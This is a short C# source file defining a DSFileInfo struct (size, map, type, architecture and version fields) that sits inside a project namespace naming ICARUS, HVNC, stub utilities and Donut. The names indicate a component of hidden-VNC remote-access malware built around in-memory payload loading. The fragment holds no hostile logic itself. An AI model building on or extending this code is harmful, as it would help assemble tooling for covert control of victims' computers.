using System.Runtime.InteropServices;

namespace ICARUS.HVNC.StubUtils.Donut.Structs
{
    public struct DSFileInfo
    {
        public int int_0;

        public ulong size;

        public byte map;

        public int type;

        public int arch;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
        public char[] ver;
    }
}
